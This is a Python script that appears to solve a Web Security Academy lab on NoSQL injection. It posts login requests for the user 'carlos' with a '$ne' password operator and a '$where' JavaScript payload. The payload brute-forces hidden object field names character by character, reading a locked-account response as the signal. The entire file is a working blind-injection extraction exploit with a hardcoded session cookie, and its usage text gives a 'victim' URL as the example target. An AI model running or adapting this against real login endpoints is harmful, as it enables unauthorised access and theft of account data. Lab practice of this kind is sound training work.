# https://0a220067032e3c3e8413416c00970070.web-security-academy.net/login

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def no_sqli(url):   
    fields = []
    
    # Set up cookies
    cookies = {'session': '5WxQiOVZYHEDhjwEt3AadLzBMGmZ9yvm'}

    # We want to discover 3 unknown fields
    for i in range(0,4):
        
        field = ""
        stopFor = False

        # We will presume that they are limited to 20 characters
        for j in range(20):

            # If the param is minor than 20 characters we will use this stopFor to break this loop and start a new field extraction
            if stopFor:
                break

            # Brute force with this characters
            for k in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        
                params = {"username":"carlos",
                        "password":{"$ne":"invalid"},
                        "$where":"Object.keys(this)[%s].match('^.{%s}%s.*')" % (i, j, k)}

                urlLogin = url + "/login"

                # Send the HTTP request to the target URL with the payload
                r = requests.post(urlLogin, cookies=cookies, verify=False, proxies=proxies, json=params)

                # If account locked is return, that's the correct character'
                if "Account" in r.text:
                    field += k
                    sys.stdout.write('\rFinding correct character: ' + field)
                    print(" "*50, end='\r', flush=True)
                    break

                else:
                    sys.stdout.write('\rFinding correct character: ' + field + k)
                    sys.stdout.flush()
                
                # If the for reaches Z and don't break in the if above, we will stop de 20 characters for loop with this
                if k == "9":
                    stopFor = True
                    fields.append(field)

    print("\n")
    print(fields)
            
            
def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    no_sqli(url)

if __name__ == "__main__":
    main()
